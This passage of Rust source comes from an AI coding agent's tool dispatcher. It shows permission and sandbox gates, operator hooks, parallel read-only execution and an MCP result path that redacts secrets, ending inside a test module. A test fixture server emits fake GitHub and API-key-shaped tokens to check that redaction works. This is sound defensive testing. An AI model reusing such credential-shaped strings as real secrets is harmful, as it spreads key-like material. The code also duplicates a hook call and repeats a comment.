    let profile = cx
        .ext::<McpToolSelection>()
        .map(|selection| selection.0.clone());
    Ok(McpDispatchPlan {
        server,
        tool,
        configuration,
        rules,
        profile,
    })
}

fn mcp_plan_is_current(
    home: &Path,
    wire: &str,
    cx: &orbit_tools::ToolContext,
    approved: &McpDispatchPlan,
) -> bool {
    capture_mcp_dispatch_plan(home, wire, cx).is_ok_and(|current| {
        current.server == approved.server
            && current.tool == approved.tool
            && current.configuration.servers == approved.configuration.servers
            && current.rules == approved.rules
            && current.profile == approved.profile
    })
}

/// Display-safe summary of a tool call (name + argument keys only).
fn safe_call_summary(call: &crate::PendingToolCall) -> String {
    let args = crate::tools::parse_arguments(&call.arguments).unwrap_or(serde_json::Value::Null);
    crate::tools::safe_call_summary(&call.name, &args)
}

/// Open the ledger writer for one append (the single-writer lock is
/// held only for the append, then released — nested sessions open
/// their own between the parent's records).
///
/// Parallel read-only calls (and a subagent racing its parent's
/// records) can hold the flock when another append tries to open:
/// that is contention, not a wedged ledger, so retry briefly with
/// backoff. E0719 is still returned once the retries are spent — the
/// caller records it as the honest failure, never invents a result.
fn reopen_writer(home: &Path) -> Result<LedgerWriter, String> {
    const ATTEMPTS: u32 = 8;
    const FIRST_WAIT_MS: u64 = 2;
    let mut wait_ms = FIRST_WAIT_MS;
    let mut last_err = String::new();
    for attempt in 0..ATTEMPTS {
        match LedgerWriter::open(&home.join("ledger"), "orbit-tool".into(), "0.1.0") {
            Ok(w) => {
                if attempt > 0 {
                    // Contention happened and cleared — the common
                    // parallel case. Nothing to log beyond the chain
                    // itself staying valid.
                }
                return Ok(w);
            }
            Err(e @ orbit_ledger::LedgerError::LedgerUnavailableAtBoot(_)) => {
                // E0719 (writer.lock held): retry with backoff.
                last_err = e.to_string();
                std::thread::sleep(std::time::Duration::from_millis(wait_ms));
                wait_ms *= 2;
            }
            Err(e) => return Err(format!("open ledger: {e}")),
        }
    }
    Err(format!("open ledger: {last_err}"))
}

fn record_result(
    home: &Path,
    session_id: &str,
    decision_id: &str,
    call: &crate::PendingToolCall,
    status: &str,
    output: &str,
    tool_cx: &orbit_tools::ToolContext,
) -> Result<(), String> {
    let mut writer = reopen_writer(home)?;
    let head = writer
        .append(LedgerEvent::ToolResult(ToolResult {
            session_id: session_id.into(),
            decision_id: decision_id.into(),
            call_id: call.id.clone(),
            tool_name: call.name.clone(),
            status: status.into(),
            output_sha256: hex::encode(Sha256::digest(output.as_bytes())),
            output_bytes: output.len() as u64,
        }))
        .map_err(|e| format!("record tool result: {e}"))?;
    // The proof surface's heartbeat (M19): every append is announced to
    // the front-end where the writer lives; the ledger crate itself
    // stays a pure library.
    tool_cx.note_ledger(orbit_tools::LedgerNote {
        kind: "result",
        target: safe_call_summary(call),
        fact: status.to_string(),
        digest: head,
    });
    Ok(())
}

/// Extract a readable message from a caught panic payload
/// (String or &str; anything else becomes "tool panicked").
fn panic_message(payload: &Box<dyn std::any::Any + Send>) -> String {
    if let Some(s) = payload.downcast_ref::<&str>() {
        (*s).to_string()
    } else if let Some(s) = payload.downcast_ref::<String>() {
        s.clone()
    } else {
        "tool panicked".to_string()
    }
}

/// S3: the standing refusal for an unrunnable sandbox.
fn sandbox_refusal() -> String {
    tool_denial(
        "refused: the shell sandbox is unavailable on this machine \
(bubblewrap missing); set ORBIT_ALLOW_UNSANDBOXED_BASH=1 to run Bash unsandboxed",
    )
}

fn tool_error(msg: &str) -> String {
    serde_json::json!({ "ok": false, "error": msg }).to_string()
}

/// A round's tools are about to run: make the turn's token the current
/// cancel check of this session's tool context. Every executor's
/// `begin_cancel_scope` is this; `end_cancel_scope` is `pop_cancel_check`.
pub fn begin_cancel_scope(cx: &orbit_tools::ToolContext, token: &orbit_provider_http::CancelToken) {
    let token = token.clone();
    cx.push_cancel_check(std::sync::Arc::new(move || token.is_cancelled()));
}

/// The answer for a call that never ran because the person pressed Esc
/// first. Typed (`error == "cancelled by user"`), so a front-end shows
/// "⊘ cancelled", not a failure, and the transcript stays valid.
pub fn cancelled_result(call: &crate::PendingToolCall) -> orbit_engine::ToolRoundResult {
    orbit_engine::ToolRoundResult {
        call_id: call.id.clone(),
        content: tool_error("cancelled by user"),
    }
}

/// Run a round's calls in order. Once the turn is cancelled, the calls
/// that have not started are answered "cancelled by user" WITHOUT
/// running: after the person says stop nothing else executes (a second
/// Bash command used to run to completion, because only the one in
/// flight was killed). `on_skip` lets a front-end settle the skipped
/// call's card.
pub fn run_until_cancelled(
    cx: &orbit_tools::ToolContext,
    calls: &[crate::PendingToolCall],
    mut run: impl FnMut(&crate::PendingToolCall) -> orbit_engine::ToolRoundResult,
    mut on_skip: impl FnMut(&crate::PendingToolCall),
) -> Vec<orbit_engine::ToolRoundResult> {
    let mut results = Vec::with_capacity(calls.len());
    for call in calls {
        if cx.is_cancelled() {
            on_skip(call);
            results.push(cancelled_result(call));
        } else {
            results.push(run(call));
        }
    }
    results
}

/// The provably parallel-safe set: read-only tools that can never ask
/// for approval. `orbit_tools::is_read_only` also names
/// AskUserQuestion and WebSearch, but those can prompt (an approval
/// channel is not `Sync`, and a prompt from a worker thread would race
/// the front-end's single ask surface) — they stay sequential. Every
/// tool here is allowed outright by the pattern layer in default mode,
/// touches no thread-local state, and its result is pure data.
pub fn is_parallel_safe(name: &str) -> bool {
    matches!(name, "Read" | "Glob" | "Grep" | "TaskList")
}

/// The bound on concurrent read-only calls. Eight matches the field
/// (Claude Code runs 8 concurrent); a round of Reads is bounded by the
/// model's own tool-call fan-out, so this is a ceiling, not a queue.
const PARALLEL_LIMIT: usize = 8;

/// Run a round's calls: a run of two or more parallel-safe read-only
/// calls runs concurrently (bounded by [`PARALLEL_LIMIT`]); everything
/// else runs sequentially in the model's order. Results come back in
/// the model's order either way, so the transcript the engine builds is
/// identical whether or not a round was parallelized.
///
/// The cancel contract is [`run_until_cancelled`]'s: once the turn is
/// cancelled, calls that have not started are answered "cancelled by
/// user" without running, and `on_skip` settles their cards.
///
/// `run` executes one call on the calling thread (the front-end's own
/// executor). `run_ro` is the same execution re-expressed for a worker
/// thread: it takes the call by value and is `Sync`. A front-end whose
/// executor cannot be shared across threads calls
/// [`run_until_cancelled`] directly and stays sequential.
pub fn run_round_parallel(
    cx: &orbit_tools::ToolContext,
    calls: &[crate::PendingToolCall],
    mut run: impl FnMut(&crate::PendingToolCall) -> orbit_engine::ToolRoundResult,
    run_ro: impl Fn(crate::PendingToolCall) -> orbit_engine::ToolRoundResult + Sync,
    mut on_skip: impl FnMut(&crate::PendingToolCall),
) -> Vec<orbit_engine::ToolRoundResult> {
    // Fast path: fewer than two parallel-safe calls is the sequential
    // loop, byte-for-byte — the common round is unchanged.
    let parallel_count = calls.iter().filter(|c| is_parallel_safe(&c.name)).count();
    if parallel_count < 2 {
        return run_until_cancelled(cx, calls, run, on_skip);
    }

    let mut results: Vec<Option<orbit_engine::ToolRoundResult>> =
        (0..calls.len()).map(|_| None).collect();

    // Walk the calls in the model's order. A maximal run of
    // parallel-safe calls is one wave; anything else runs sequentially
    // (writes keep their order and their approval surface).
    let mut i = 0;
    while i < calls.len() {
        // Cancelled before this call starts: the rest never run.
        if cx.is_cancelled() {
            for call in &calls[i..] {
                on_skip(call);
            }
            for (j, call) in calls[i..].iter().enumerate() {
                results[i + j] = Some(cancelled_result(call));
            }
            break;
        }

        if !is_parallel_safe(&calls[i].name) {
            results[i] = Some(run(&calls[i]));
            i += 1;
            continue;
        }

        // The maximal run of parallel-safe calls starting at i.
        let start = i;
        while i < calls.len() && is_parallel_safe(&calls[i].name) {
            i += 1;
        }

        if i - start == 1 {
            results[start] = Some(run(&calls[start]));
            continue;
        }

        // Two or more: batches of PARALLEL_LIMIT, in order. One scope
        // per batch; every result lands back at its position in the
        // round, so the model's order is restored.
        for batch_start in (start..i).step_by(PARALLEL_LIMIT) {
            let batch_end = (batch_start + PARALLEL_LIMIT).min(i);
            let batch = &calls[batch_start..batch_end];

            if cx.is_cancelled() {
                for (j, call) in batch.iter().enumerate() {
                    on_skip(call);
                    results[batch_start + j] = Some(cancelled_result(call));
                }
                continue;
            }

            let run_ro = &run_ro;
            std::thread::scope(|s| {
                let handles: Vec<_> = batch
                    .iter()
                    .enumerate()
                    .map(|(j, call)| {
                        let idx = batch_start + j;
                        let call = call.clone();
                        s.spawn(move || (idx, run_ro(call)))
                    })
                    .collect();
                for h in handles {
                    // A panicked worker leaves its slot empty; the
                    // pass below fills it in the call's own place.
                    if let Ok((idx, r)) = h.join() {
                        results[idx] = Some(r);
                    }
                }
            });

            // A worker that panicked left its slot empty: answer the
            // call in its own place, never silently drop it.
            for (j, call) in batch.iter().enumerate() {
                if results[batch_start + j].is_none() {
                    results[batch_start + j] = Some(orbit_engine::ToolRoundResult {
                        call_id: call.id.clone(),
                        content: tool_error("tool panicked"),
                    });
                }
            }
        }
    }

    // Every call has a result: the transcript the engine builds stays
    // valid whatever happened above.
    results
        .into_iter()
        .zip(calls.iter())
        .map(|(r, call)| r.unwrap_or_else(|| cancelled_result(call)))
        .collect()
}

/// A permission refusal (C4): the typed `denied` flag marks "policy or
/// the operator said no" — distinct from a tool that ran and failed
/// (D9). Exit codes, the ToolDenied event and the UI's denial glyph
/// key on the flag, never on message substrings.
fn tool_denial(msg: &str) -> String {
    serde_json::json!({ "ok": false, "denied": true, "error": msg }).to_string()
}

/// Execute one Wave 1 call through the orbit-tools registry with the
/// live permission layer: modes, pattern rules, folder trust, deny-read
/// and the secret scanner. The verdict above (whole-tool rules +
/// approval channel) already ran; this adds the pattern-level check.
fn execute_wave1(
    home: &Path,
    scope: &PermissionScope,
    call: &crate::PendingToolCall,
    args: &serde_json::Value,
    tool_cx: &orbit_tools::ToolContext,
) -> (String, Option<FileChange>) {
    use orbit_tools::permissions::{RuleEffectSerde, evaluate, parse_rule};

    // Merged rules: the new pattern scopes + the legacy whole-tool file.
    let mut rules = orbit_tools::executor::load_rules_in(home, &tool_cx.working_dir);
    let mut read_scope = scope.clone();
    if call.name == "Read"
        && let Some(path) = args.get("file_path").and_then(serde_json::Value::as_str)
    {
        match crate::plugin_content::asset_policy_path(tool_cx, path) {
            Ok(Some(path)) => {
                let mut alias = args.clone();
                alias["file_path"] = path.to_string_lossy().into_owned().into();
                match asset_read_scope(scope, args, &alias) {
                    Ok(scope) => read_scope = scope,
                    Err(error) => return (tool_denial(&error), None),
                }
            }
            Err(error) => return (tool_denial(&error), None),
            Ok(None) => {}
        }
    }
    let scope = &read_scope;
    // --allowedTools / --disallowedTools (command-line scope), from the
    // session's PermissionScope (S5) — not process env.
    // An explicit operator allowlist (--allowedTools / settings) is a
    // SCOPE statement: only what it names may run. The flag is tracked
    // separately so the pure-built-in bypass below cannot punch
    // through it (gate 6: a CI allowlist without calculator must deny
    // calculator with exit 2, not let the built-in run).
    if let Some(list) = &scope.allowlist {
        for entry in list {
            if let Some(r) = parse_rule(entry, RuleEffectSerde::Allow) {
                rules.rules.push(r);
            }
        }
    }
    for entry in &scope.disallowlist {
        if let Some(r) = parse_rule(entry, RuleEffectSerde::Deny) {
            rules.rules.push(r);
        }
    }

    // Find the tool and compute its permission key.
    let Some(tool) = orbit_tools::registry()
        .into_iter()
        .find(|t| t.name() == call.name)
    else {
        return (tool_denial("unknown tool (deny-by-default)"), None);
    };
    let key = tool.permission_key(args);
    let is_ro_cmd = call.name == "Bash"
        && orbit_tools::bash::is_readonly_command(
            args.get("command").and_then(|v| v.as_str()).unwrap_or(""),
        );

    // Hooks (phase 5): PreToolUse fires BEFORE every other gate —
    // hooks are the operator's policy layer and must see (and be able
    // to block) every call, whatever the machine's sandbox state.
    // PostToolUse sees the result.
    let hooks = orbit_engine::hooks::Hooks::load(home, project_trusted_home(home));
    let pre = hooks.fire(
        orbit_engine::hooks::HookEvent::PreToolUse,
        &serde_json::json!({
            "tool": call.name,
            "arguments": args,
        }),
    );
    if let Some(reason) = orbit_engine::hooks::blocked(&pre) {
        return (tool_denial(&format!("blocked by hook: {reason}")), None);
    }

    // S3: when the shell sandbox cannot run on this machine, a Bash
    // command must not execute unsandboxed on an allow verdict. The
    // operator opts in explicitly (ORBIT_ALLOW_UNSANDBOXED_BASH=1) or
    // the call is refused with the reason. Read-only commands are
    // still safe to run bare.
    let sandbox_up = call.name != "Bash"
        || is_ro_cmd
        || matches!(
            orbit_tools::sandbox::ShellSandbox::probe(),
            orbit_tools::sandbox::SandboxStatus::Confined
        )
        || std::env::var("ORBIT_ALLOW_UNSANDBOXED_BASH")
            .map(|v| v == "1")
            .unwrap_or(false);

    match evaluate(
        scope.mode,
        &rules,
        &key.tool,
        &key.pattern,
        tool.read_only(),
        is_ro_cmd,
    ) {
        // S3 binds on every path that would RUN the command: a plain
        // allow, and the ask-collapse (the operator approved the call
        // — but not running it bare on a sandbox-less machine).
        orbit_tools::permissions::Verdict::Allow if !sandbox_up => {
            return (sandbox_refusal(), None);
        }
        orbit_tools::permissions::Verdict::Allow => {}
        orbit_tools::permissions::Verdict::Deny(reason) => {
            return (tool_denial(&reason), None);
        }
        orbit_tools::permissions::Verdict::Ask if !sandbox_up => return (sandbox_refusal(), None),
        orbit_tools::permissions::Verdict::Ask => {
            // The whole-tool verdict above already asked the channel
            // (the operator pressed y). Pattern-level ask collapses to
            // allow here — the operator's approval IS the answer.
        }
    }

    // Execute with the SESSION's ToolContext (B2): the clone shares
    // the read-before-edit map, so a Read in an earlier round
    // satisfies Edit's precondition. A fresh context per call is what
    // made Edit always refuse.
    let cx = tool_cx.clone();

    let hooks = orbit_engine::hooks::Hooks::load(home, project_trusted_home(home));
    let pre = hooks.fire(
        orbit_engine::hooks::HookEvent::PreToolUse,
        &serde_json::json!({
            "tool": call.name,
            "arguments": args,
        }),
    );
    if let Some(reason) = orbit_engine::hooks::blocked(&pre) {
        return (tool_denial(&format!("blocked by hook: {reason}")), None);
    }

    // Checkpoint (phase 4): before the first WRITE of a turn, snapshot
    // the target file's current bytes so /rewind can restore them.
    // M11: remember the "before" bytes so the change can carry a real
    // diff to the Changes panel (line counts from the diff, hunks from
    // the same bytes — nothing invented).
    let mut before: Option<(std::path::PathBuf, Vec<u8>, String)> = None;
    if (call.name == "Write" || call.name == "Edit")
        && let Some(path_str) = args.get("file_path").and_then(|v| v.as_str())
    {
        let path = orbit_tools::resolve_path(&cx, path_str);
        if path.exists() {
            let cps = orbit_engine::transcript::Checkpoints::new(home, &cx.session_id);
            // E7: one checkpoint id per turn — the context mints
            // it on first write and reuses it for the turn.
            let turn_cp = cx.turn_checkpoint_id();
            if let Ok(pre) = std::fs::read(&path) {
                let _ = cps.snapshot_file(&turn_cp, &path);
                before = Some((path, pre, turn_cp));
            }
        } else if call.name == "Write" {
            // A file created from nothing is still a change — a diff
            // against an empty "before". (There is nothing to
            // snapshot: the checkpoint restores what existed.) It used
            // to leave no event at all, so a new file never reached
            // the Changes or Review panel.
            before = Some((path, Vec::new(), cx.turn_checkpoint_id()));
        }
    }

    // B1: a tool bug must become a tool error, never a dead worker
    // (a panic here used to take the whole process or the TUI thread).
    let result = match std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
        if call.name == "Read"
            && let Some(path) = args.get("file_path").and_then(|value| value.as_str())
            && path.starts_with("orbit-plugin://")
        {
            return crate::plugin_content::asset_result(&cx, args);
        }
        tool.run(args, &cx)
    })) {
        Ok(result) => result,
        Err(panic) => {
            let reason = panic_message(&panic);
            orbit_tools::ToolResult::err(&format!(
                "internal tool error: {reason} (the panic was contained)"
            ))
        }
    };
    let result = orbit_tools::finish(result, &cx, &call.id);

    // PostToolUse: the hook sees the (scanned) result.
    let _ = hooks.fire(
        orbit_engine::hooks::HookEvent::PostToolUse,
        &serde_json::json!({
            "tool": call.name,
            "ok": !result.is_error,
        }),
    );

    // M11: a successful checkpointed write carries a real diff — the
    // "before" bytes were captured above, the "after" bytes are read
    // now. Counts are the true totals; hunks are bounded (context 2,
    // first 4 hunks, 6 lines each) for the panel's line budget.
    let file_change = match (&before, result.is_error) {
        (Some((path, pre, cp)), false) => {
            let after = std::fs::read(path).ok();
            after.map(|post| {
                let old = String::from_utf8_lossy(pre).into_owned();
                let new = String::from_utf8_lossy(&post).into_owned();
                let (added, removed) = orbit_engine::diff::counts(&old, &new);
                let hunks = orbit_engine::diff::hunks(&old, &new);
                FileChange {
                    path: path.to_string_lossy().into_owned(),
                    added,
                    removed,
                    checkpoint_id: cp.clone(),
                    hunks,
                }
            })
        }
        _ => None,
    };

    (result.payload, file_change)
}

/// Is the current folder trusted (project-scope rules/hooks/skills
/// apply only after the operator trusted it once)? Resolved against
/// the caller's REAL home path — the command
/// line's --home does not set the env var, so any helper that resolved
/// trust through the env silently skipped project scope (the MCP call
/// path reported "mcp server not configured" for a configured, trusted
/// project server).
/// The command
/// line's --home does not set the env var, so any helper that resolved
/// trust through the env silently skipped project scope (the MCP call
/// path reported "mcp server not configured" for a configured, trusted
/// project server).
fn project_trusted_home(home: &Path) -> bool {
    let cwd = std::env::current_dir().unwrap_or_default();
    orbit_tools::permissions::FolderTrust::new(home.to_path_buf()).is_trusted(&cwd)
}

/// Execute one MCP call: resolve the server from the config, spawn,
/// call, scan the result (never trust external output).
fn execute_mcp(
    home: &Path,
    call: &crate::PendingToolCall,
    args: &serde_json::Value,
    cx: &orbit_tools::ToolContext,
    plan: &McpDispatchPlan,
) -> String {
    if !mcp_plan_is_current(home, &call.name, cx, plan) {
        return tool_denial(
            "MCP configuration or policy changed before dispatch; request confirmation again",
        );
    }
    if cx
        .ext::<McpToolSelection>()
        .is_some_and(|selection| !selection.0.contains(&call.name))
    {
        return mcp_error("MCP tool is outside the agent's tool selection");
    }
    let server_cfg = &plan.configuration.servers[&plan.server];
    // The process-lifetime pool: the server was spawned once (at
    // definition build) and is reused across every call (phase 5 —
    // no re-spawn, no re-handshake per tool call).
    let mut options =
        orbit_mcp::McpCallOptions::new(std::time::Duration::from_millis(server_cfg.timeout_ms));
    options.cancel = cx.cancel_check();
    options.working_dir = Some(cx.working_dir.clone());
    match orbit_mcp::POOL.call_tool_with_options(
        &plan.server,
        server_cfg,
        &plan.tool,
        args.clone(),
        &options,
    ) {
        Ok(result) => {
            let ok = !result
                .get("isError")
                .and_then(|v| v.as_bool())
                .unwrap_or(false);
            // Scan decoded strings throughout the complete bounded frame,
            // including structured data and content that is not plain text.
            let mut safe_result = result;
            let mut redactions = 0;
            scan_mcp_value(&mut safe_result, &mut redactions);
            bounded_mcp_output(
                serde_json::json!({
                    "ok": ok,
                    "result_error": !ok,
                    "result": mcp_result_text(&safe_result),
                    "redactions": redactions,
                }),
                "result",
            )
        }
        Err(e) => mcp_error(&format!("mcp call failed: {e}")),
    }
}

/// The profile selection is trusted runtime state, never a tool argument.
#[derive(Clone)]
struct McpToolSelection(Vec<String>);

/// Inherited profile authority for the configured diagnostics integration.
#[derive(Clone)]
pub struct LspToolSelection(pub bool);

/// A child profile can narrow its parent's diagnostics authority, never widen it.
pub fn set_lsp_tool_selection(
    child: &orbit_tools::ToolContext,
    parent: &orbit_tools::ToolContext,
    tools: &[String],
) {
    let parent_allowed = parent
        .ext::<LspToolSelection>()
        .is_none_or(|allowed| allowed.0);
    let profile_allowed = tools.is_empty() || tools.iter().any(|name| name == "LspDiagnostics");
    child.set_ext(LspToolSelection(parent_allowed && profile_allowed));
}

pub(crate) fn effective_mcp_tool_selection(
    cx: &orbit_tools::ToolContext,
    requested: Option<&[String]>,
) -> Option<Vec<String>> {
    let requested = requested.filter(|names| !names.is_empty());
    match (cx.ext::<McpToolSelection>(), requested) {
        (Some(parent), Some(names)) => Some(
            parent
                .0
                .iter()
                .filter(|name| crate::plugin_content::selected(cx, Some(names), name))
                .cloned()
                .collect(),
        ),
        (Some(parent), None) => Some(parent.0.clone()),
        (None, Some(names)) => Some(names.to_vec()),
        (None, None) => None,
    }
}

pub(crate) fn set_mcp_tool_selection_exact(
    child: &orbit_tools::ToolContext,
    parent: &orbit_tools::ToolContext,
    wires: &[String],
) {
    let selected = wires
        .iter()
        .filter(|wire| {
            parent
                .ext::<McpToolSelection>()
                .is_none_or(|parent| parent.0.contains(wire))
        })
        .cloned()
        .collect();
    child.set_ext(McpToolSelection(selected));
}

#[cfg(test)]
pub(crate) fn set_mcp_tool_selection(
    child: &orbit_tools::ToolContext,
    parent: &orbit_tools::ToolContext,
    tools: &[String],
) {
    if let Some(selection) = effective_mcp_tool_selection(parent, Some(tools)) {
        child.set_ext(McpToolSelection(selection));
    }
}

fn scan_mcp_text(text: &str) -> (String, usize) {
    // First scan whole lines for assignments and multiline private-key blocks.
    let scanned = orbit_tools::scan::scan_result(text);
    let mut count = scanned.redactions.len();
    let mut safe = String::with_capacity(scanned.text.len());
    // The common scanner handles one token of each family per line. Scan the
    // remaining token spans independently without repeatedly copying a large
    // frame; this also catches a short prefix preceding a real token.
    for span in scanned
        .text
        .split_inclusive(|c: char| !(c.is_ascii_alphanumeric() || c == '_' || c == '-'))
    {
        let scanned = orbit_tools::scan::scan_result(span);
        count += scanned.redactions.len();
        safe.push_str(&scanned.text);
    }
    (safe, count)
}

fn scan_mcp_value(value: &mut serde_json::Value, redactions: &mut usize) {
    scan_mcp_value_with_key(value, redactions, false);
}

fn scan_mcp_value_with_key(
    value: &mut serde_json::Value,
    redactions: &mut usize,
    sensitive_key: bool,
) {
    match value {
        serde_json::Value::String(text) => {
            // Structured JSON separates a secret's label from its value. Keep
            // that association for the common high-entropy assignment rule.
            if sensitive_key {
                let assignment = orbit_tools::scan::scan_result(&format!("TOKEN = {text}"));
                if assignment
                    .redactions
                    .iter()
                    .any(|kind| kind == "secret assignment")
                {
                    *text = "[redacted:secret]".into();
                    *redactions += 1;
                    return;
                }
            }
            let (safe, count) = scan_mcp_text(text);
            *text = safe;
            *redactions += count;
        }
        serde_json::Value::Array(values) => {
            for value in values {
                scan_mcp_value_with_key(value, redactions, sensitive_key);
            }
        }
        serde_json::Value::Object(values) => {
            let original = std::mem::take(values);
            for (child_key, mut value) in original {
                // Classify each raw key once. Carry a boolean through its
                // descendants so a huge key plus many leaves stays linear.
                let assignment = orbit_tools::scan::scan_result(&format!(
                    "{child_key} = AbCDef1234567890gHiJKLmN7890xyzPQ"
                ));
                let child_sensitive = sensitive_key
                    || assignment
                        .redactions
                        .iter()
                        .any(|kind| kind == "secret assignment");
                let (safe_key, count) = scan_mcp_text(&child_key);
                *redactions += count;
                scan_mcp_value_with_key(&mut value, redactions, child_sensitive);
                values.insert(safe_key, value);
            }
        }
        _ => {}
    }
}

fn mcp_error(error: &str) -> String {
    const SERVER_ERROR_PREFIX: &str = "mcp call failed: mcp server error: ";
    if let Some(body) = error.strip_prefix(SERVER_ERROR_PREFIX)
        && let Ok(mut value) = serde_json::from_str::<serde_json::Value>(body)
    {
        let mut redactions = 0;
        scan_mcp_value(&mut value, &mut redactions);
        return bounded_mcp_output(
            serde_json::json!({ "ok":false, "result_error":true,
                    "error":format!("{SERVER_ERROR_PREFIX}{value}"), "redactions":redactions }),
            "error",
        );
    }
    let (safe, redactions) = scan_mcp_text(error);
    bounded_mcp_output(
        serde_json::json!({ "ok": false, "result_error": true, "error": safe,
            "redactions": redactions }),
        "error",
    )
}

/// Measure the complete serialized envelope, including escaping and flags.
fn bounded_mcp_output(mut response: serde_json::Value, field: &str) -> String {
    let encoded = response.to_string();
    if encoded.len() <= MAX_RESULT_BYTES {
        return encoded;
    }
    let full = response[field].take().as_str().unwrap_or("").to_string();
    response[field] = "".into();
    response["truncated"] = true.into();
    let budget = MAX_RESULT_BYTES.saturating_sub(response.to_string().len());
    let mut upper = full.len().min(budget);
    while !full.is_char_boundary(upper) {
        upper -= 1;
    }
    let mut boundaries: Vec<usize> = full[..upper].char_indices().map(|(i, _)| i).collect();
    boundaries.push(upper);
    let (mut low, mut high) = (0, boundaries.len() - 1);
    while low < high {
        let middle = low + (high - low).div_ceil(2);
        response[field] = full[..boundaries[middle]].into();
        if response.to_string().len() <= MAX_RESULT_BYTES {
            low = middle;
        } else {
            high = middle - 1;
        }
    }
    response[field] = full[..boundaries[low]].into();
    response.to_string()
}

/// Text blocks remain readable; structured-only and non-text results remain visible.
fn mcp_result_text(result: &serde_json::Value) -> String {
    let blocks = result.get("content").and_then(|c| c.as_array());
    let mut parts = Vec::new();
    if let Some(blocks) = blocks {
        for block in blocks {
            parts.push(
                block
                    .get("text")
                    .and_then(|v| v.as_str())
                    .map(str::to_string)
                    .unwrap_or_else(|| block.to_string()),
            );
        }
    }
    if let Some(structured) = result.get("structuredContent") {
        parts.push(structured.to_string());
    }
    if parts.is_empty() {
        result.to_string()
    } else {
        parts.join("\n")
    }
}

#[cfg(all(test, unix))]
mod mcp_runtime_tests {
    use super::*;
    use serde_json::{Value, json};
    use std::path::PathBuf;
    use std::sync::{
        Arc,
        atomic::{AtomicBool, Ordering},
    };
    use std::time::{Duration, Instant};

    struct Fixture {
        home: PathBuf,
        work: PathBuf,
        server: String,
        cx: orbit_tools::ToolContext,
    }

    impl Fixture {
        fn new() -> Self {
            let server = format!("fixture{}", ulid::Ulid::new());
            let home = std::env::temp_dir().join(format!("orbit-mcp-cli-{server}"));
            let work = home.join("work");
            std::fs::create_dir_all(&work).unwrap();
            std::fs::write(home.join("server.py"), r#"
import json, os, sys, time
with open(sys.argv[1], 'a') as log:
    log.write('spawn\n')
for line in sys.stdin:
    request = json.loads(line)
    method = request.get('method', '')
    with open(sys.argv[1], 'a') as log:
        log.write(method + '\n')
    if 'id' not in request:
        continue
    reply = {'jsonrpc': '2.0', 'id': request['id']}
    if method == 'initialize':
        reply['result'] = {'protocolVersion': '2025-06-18', 'capabilities': {}, 'serverInfo': {'name': 'fixture', 'version': '1'}}
    elif method == 'tools/list':
        reply['result'] = {'tools': [{'name': n, 'description': 'test', 'inputSchema': {'type':'object'}} for n in ['action', 'structured', 'error', 'large', 'silent', 'server_error']]}
    elif method == 'tools/call':
        name = request['params']['name']
        if name == 'silent':
            time.sleep(10)
            continue
        if name == 'server_error':
            reply['error'] = {'code': -32603, 'message': 'ghp_abcdefghijklmnopqrstuvwxyz123456 sk-abcdefghijklmnopqrstuvwxyz654321', 'data': {'api_key': 'AbCDef1234567890gHiJKLmN7890xyzPQ', 'nested': [{'password': ['AbCDef1234567890gHiJKLmN7890xyzPQ']}]}}
        elif name == 'echo':
            reply['result'] = {'content': [{'type': 'text', 'text': json.dumps(request['params']['arguments'])}]}
        elif name == 'structured':
            reply['result'] = {'content': [], 'structuredContent': {'answer': 42, 'token': 'ghp_abcdefghijklmnopqrstuvwxyz123456', 'api_key': 'AbCDef1234567890gHiJKLmN7890xyzPQ', 'nested': [{'password': ['AbCDef1234567890gHiJKLmN7890xyzPQ']}]}}
        elif name == 'error':
            reply['result'] = {'isError': True, 'content': [{'type': 'text', 'text': 'failed ghp_abcdefghijklmnopqrstuvwxyz123456 ghp_abcdefghijklmnopqrstuvwxyz654321'}]}
        elif name == 'large':
            reply['result'] = {'content': [{'type': 'text', 'text': 'ghp_abcdefghijklmnopqrstuvwxyz123456 ghp_abcdefghijklmnopqrstuvwxyz654321\n' + '\x00\n\t"\\é' * 40000 + '\nlate sk-abcdefghijklmnopqrstuvwxyz123456'}]}
        else:
            reply['result'] = {'content': [{'type': 'text', 'text': os.getcwd()}]}
    else:
        reply['error'] = {'code': -32601, 'message': 'unknown method'}
    print(json.dumps(reply, ensure_ascii=False), flush=True)
    if method == 'tools/call':
        break
"#).unwrap();
            let cx = orbit_tools::ToolContext::new(home.clone(), "mcp-owner".into(), work.clone());
            let fixture = Self {
                home,
                work,
                server,
                cx,
            };
            fixture.config(json!({}));
            fixture
        }
        fn config_value(&self, extra: Value) -> Value {
            let mut server = json!({"command":"python3", "args":[self.home.join("server.py"), self.home.join("calls.log")], "timeout_ms":500, "initialize_timeout_ms":300});
            for (key, value) in extra.as_object().unwrap() {
                server[key] = value.clone();
            }
            json!({"servers":{(self.server.clone()):server}})
        }
        fn config(&self, extra: Value) {
            std::fs::write(
                self.home.join("mcp.json"),
                self.config_value(extra).to_string(),
            )
            .unwrap();
        }
        fn wire(&self, tool: &str) -> String {
            orbit_mcp::wire_name(&self.server, tool)
        }
        fn call(&self, tool: &str, scope: &PermissionScope) -> Value {
            self.call_with_args(tool, json!({}), scope)
        }
        fn call_with_args(&self, tool: &str, args: Value, scope: &PermissionScope) -> Value {
            let call = crate::PendingToolCall {
                index: 0,
                id: format!("call-{}", ulid::Ulid::new()),
                name: self.wire(tool),
                arguments: serde_json::to_vec(&args).unwrap(),
            };
            let (output, _) = execute_call(
                &self.home,
                "mcp-owner",
                "decision",
                &call,
                true,
                false,
                &mut StdApprovalChannel::new(false),
                &mut AutoGrants::new(),
                scope,
                &self.cx,
            )
            .unwrap();
            assert!(output.len() <= MAX_RESULT_BYTES);
            serde_json::from_str(&output).unwrap()
        }
        fn log(&self) -> String {
            std::fs::read_to_string(self.home.join("calls.log")).unwrap_or_default()
        }
        fn status(&self) -> String {
            let (records, _) =
                orbit_ledger::reader::verify_ledger(&self.home.join("ledger")).unwrap();
            records
                .iter()
                .rev()
                .find_map(|record| match &record.record.event {
                    LedgerEvent::ToolResult(result) => Some(result.status.clone()),
                    _ => None,
                })
                .unwrap()
        }
    }
    impl Drop for Fixture {
        fn drop(&mut self) {
            let _ = std::fs::remove_dir_all(&self.home);
        }
    }

    #[test]
    fn dispatcher_preserves_server_errors_and_ledger_status() {
        let fixture = Fixture::new();
        let out = fixture.call("error", &PermissionScope::default());
        assert_eq!(out["ok"], false);
        assert_eq!(out["result_error"], true);
        assert_eq!(fixture.status(), "error");
        assert!(out["result"].as_str().unwrap().contains("failed"));
        assert!(out["redactions"].as_u64().unwrap() >= 2);
        assert!(!out.to_string().contains("abcdefghijklmnopqrstuvwxyz"));
